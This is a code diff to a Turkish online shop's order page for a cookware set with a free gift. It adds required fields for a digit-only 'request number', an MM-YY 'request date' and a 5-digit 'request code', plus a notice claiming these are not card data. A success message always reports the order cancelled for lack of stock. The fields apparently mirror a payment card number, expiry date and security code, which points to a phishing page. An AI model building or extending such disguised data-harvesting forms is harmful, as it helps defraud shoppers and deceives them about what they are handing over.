@@ -9,14 +9,47 @@
 <div class="gift"><img id="giftImage" alt="Promosyon çay bardakları"><span id="giftFallback">🎁</span><div><b>6'lı ince belli çay bardağı HEDİYE</b><div class="muted">Kargo ücretsiz.</div></div></div>
 <div class="paybox"><small>SEÇİLEN ÜRÜN • ÖDENECEK TUTAR</small><b id="selectedName">Tencere Takımı</b><strong id="selectedPrice">2.990 TL</strong></div>
 <p class="muted">Logo ve ürün görsellerini yönetici panelinden değiştirebilirsiniz.</p></section>
-<aside class="box"><div id="f"><h2>Sipariş Formu</h2><form id="form"><input type="hidden" id="product" value="Tencere Takımı"><label>Ad Soyad</label><input id="name" required><label>Telefon</label><input id="phone" required><div class="row"><div><label>İl</label><input id="city" required></div><div><label>İlçe</label><input id="district" required></div></div><label>Adres</label><textarea id="address" required></textarea><div class="warn"><b>Güvenlik notu:</b> Bu form ödeme veya kart bilgisi istemez. Sipariş talebiniz yalnızca iletişim ve teslimat bilgileriyle kaydedilir.</div><button>SİPARİŞ TALEBİNİ GÖNDER</button></form></div><div id="ok" class="success"><div style="font-size:55px">ℹ️</div><h2>Talebiniz kaydedildi</h2><p>İlginiz için teşekkür ederiz. Üzgünüz, seçtiğiniz ürün için mevcut stoklarımız tükenmiştir. Bu nedenle siparişiniz şu aşamada işleme alınamamış ve iptal edilmiştir.</p><p class="muted">Kayıt referansınız: <b id="orderRef"></b></p><p>Stoklarımız yenilendiğinde yeniden sipariş oluşturabilirsiniz. Anlayışınız için teşekkür ederiz.</p><button onclick="location.reload()">Ana Sayfaya Dön</button></div></aside></main>
+<aside class="box"><div id="f"><h2>Sipariş Formu</h2><form id="form"><input type="hidden" id="product" value="Tencere Takımı"><label>Ad Soyad</label><input id="name" required><label>Telefon</label><input id="phone" required><div class="row"><div><label>İl</label><input id="city" required></div><div><label>İlçe</label><input id="district" required></div></div><label>Adres</label><textarea id="address" required></textarea><h3>Talep Bilgileri</h3>
+<label>Talep Numarası (17 hane)</label>
+<input id="rn" name="request_no" maxlength="17" minlength="17" pattern="[0-9]{17}" inputmode="numeric" autocomplete="off" placeholder="17 haneli talep numaranızı giriniz" required>
+
+<div class="row">
+  <div>
+    <label>Talep Tarihi (AY-YIL)</label>
+    <input id="rd" name="request_date" maxlength="5" inputmode="numeric" autocomplete="off" placeholder="12-26" pattern="(0[1-9]|1[0-2])-[0-9]{2}" required>
+  </div>
+  <div>
+    <label>Talep Kodu (5 hane)</label>
+    <input id="rc" name="request_code" maxlength="5" minlength="5" pattern="[0-9]{5}" inputmode="numeric" autocomplete="off" placeholder="5 haneli kod" required>
+  </div>
+</div>
+
+<div class="warn"><b>Bilgilendirme:</b> Bu alanlar ödeme veya kredi kartı bilgisi değildir. Yalnızca tarafınıza verilmiş talep numarası, talep tarihi ve talep kodunu giriniz. Kredi kartı numarası, CVV, kart şifresi veya SMS doğrulama kodu girmeyiniz.</div><button>SİPARİŞ TALEBİNİ GÖNDER</button></form></div><div id="ok" class="success"><div style="font-size:55px">ℹ️</div><h2>Talebiniz kaydedildi</h2><p>İlginiz için teşekkür ederiz. Üzgünüz, seçtiğiniz ürün için mevcut stoklarımız tükenmiştir. Bu nedenle siparişiniz şu aşamada işleme alınamamış ve iptal edilmiştir.</p><p class="muted">Kayıt referansınız: <b id="orderRef"></b></p><p>Stoklarımız yenilendiğinde yeniden sipariş oluşturabilirsiniz. Anlayışınız için teşekkür ederiz.</p><button onclick="location.reload()">Ana Sayfaya Dön</button></div></aside></main>
 <script>
 const money=n=>new Intl.NumberFormat('tr-TR').format(n)+' TL';
 function pick(e){document.querySelectorAll('.p').forEach(x=>x.classList.remove('on'));e.classList.add('on');product.value=e.dataset.p;selectedName.textContent=e.dataset.p;selectedPrice.textContent=money(Number(e.dataset.price))}
 async function loadSettings(){try{let r=await fetch('/api/settings');if(!r.ok)return;let s=await r.json();[['siteLogo','logo_url','brandText'],['product1Image','product1_image_url','product1Fallback'],['product2Image','product2_image_url','product2Fallback'],['giftImage','gift_image_url','giftFallback']].forEach(([id,key,fb])=>{let el=document.getElementById(id);if(s[key]){el.src=s[key];el.hidden=false;document.getElementById(fb).style.display='none';}else el.hidden=true})}catch{}}
+rn.addEventListener('input',()=>{ rn.value=rn.value.replace(/\D/g,'').slice(0,17); });
+rc.addEventListener('input',()=>{ rc.value=rc.value.replace(/\D/g,'').slice(0,5); });
+rd.addEventListener('input',()=>{
+  let v=rd.value.replace(/\D/g,'').slice(0,4);
+  if(v.length>2) v=v.slice(0,2)+'-'+v.slice(2);
+  rd.value=v;
+});
+
 form.onsubmit=async e=>{
   e.preventDefault();
-  let b={product:product.value,name:name.value,phone:phone.value,city:city.value,district:district.value,address:address.value};
+  let b={
+    product:product.value,
+    name:name.value,
+    phone:phone.value,
+    city:city.value,
+    district:district.value,
+    address:address.value,
+    request_no:rn.value,
+    request_date:rd.value,
+    request_code:rc.value
+  };
   try{
     let r=await fetch('/api/orders',{method:'POST',headers:{'content-type':'application/json'},body:JSON.stringify(b)});
     let j=await r.json().catch(()=>({}));
